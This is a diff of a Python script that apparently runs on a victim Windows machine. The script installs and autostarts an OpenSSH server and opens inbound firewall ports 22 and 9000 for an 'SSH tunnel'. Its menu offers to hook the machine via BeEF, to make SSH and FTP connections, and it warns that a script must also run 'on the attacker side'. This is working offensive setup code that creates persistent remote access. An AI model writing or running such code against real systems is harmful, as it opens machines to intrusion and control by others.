@@ -47,29 +47,33 @@ run_ps(permapath)
 #define powershell path
 pspath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
 
-#link for the openSSH installation: https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=powershell&pivots=windows-10
 
-#installing OpenSSH Client and Server via PowerShell commands
-installsshd="Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0"
-run_ps(installsshd)
-
-installsshdserver="Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
-run_ps(installsshdserver)
-sleep(2)
-startservice="Start-Service sshd"
-run_ps(startservice)
-sleep(2)
-startupsshd="Set-Service -Name sshd -StartupType 'Automatic'"
-run_ps(startupsshd)
-sleep(2)
-addtopath = '$env:PATH += ";C:\\Windows\\System32\\OpenSSH"'
-run_ps(addtopath)
+#asking if to skip firewall config and openSSH install/config
+skip=input("Skip openSSH install and config? (for first program startup not recommended)  y/n: ")
+if skip == "n":
+    
+    #installing OpenSSH Client and Server via PowerShell commands
+    #link for the openSSH installation: https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=powershell&pivots=windows-10
+    installsshd="Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0"
+    run_ps(installsshd)
+    
+    installsshdserver="Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
+    run_ps(installsshdserver)
+    sleep(2)
+    startservice="Start-Service sshd"
+    run_ps(startservice)
+    sleep(2)
+    startupsshd="Set-Service -Name sshd -StartupType 'Automatic'"
+    run_ps(startupsshd)
+    sleep(2)
+    addtopath = '$env:PATH += ";C:\\Windows\\System32\\OpenSSH"'
+    run_ps(addtopath)
 
 #allowing p22 and p9000 in firewall
-fwr22 = 'New-NetFirewallRule -DisplayName "Allow SSH 22" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow'
-run_ps(fwr22)
-fwr9000 = 'New-NetFirewallRule -DisplayName "Allow SSH Tunnel 9000" -Direction Inbound -Protocol TCP -LocalPort 9000 -Action Allow'
-run_ps(fwr9000)
+    fwr22 = 'New-NetFirewallRule -DisplayName "Allow SSH 22" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow'
+    run_ps(fwr22)
+    fwr9000 = 'New-NetFirewallRule -DisplayName "Allow SSH Tunnel 9000" -Direction Inbound -Protocol TCP -LocalPort 9000 -Action Allow'
+    run_ps(fwr9000)
 
 print(Fore.YELLOW + "!!!THIS PROGRAM IS NEEDED TO "+ Fore.RED + "RUN VIA CMD WITH ADMIN PRIVILEGES " + Fore.YELLOW + "TO RUN PROPERLY!!!")
 sleep(4)
@@ -104,6 +108,8 @@ while True:
     print("2) Attempt to hook this machine via BeEF")
     sleep(0.1)
     print("3) Attempt a local SSH connection")
+    sleep(0.1)
+    print("4) Attempt a FTP connection")
     sleep(0.1)
     print("")
     sleep(0.1)
@@ -180,7 +186,7 @@ while True:
 
 #Action 3 = local SSH connection
     if action == "3":
-        print(Fore.RED + "!!!Warning, you need to run a script on the attacker side aswell before this action!!!")
+        print(Fore.RED + "!!!Warning, you need to run a script on the attacker side aswell to conenct!!!")
         while True:
             attackerscriptcontinue=input("Continue? y/n: ")
             sleep(0.1)
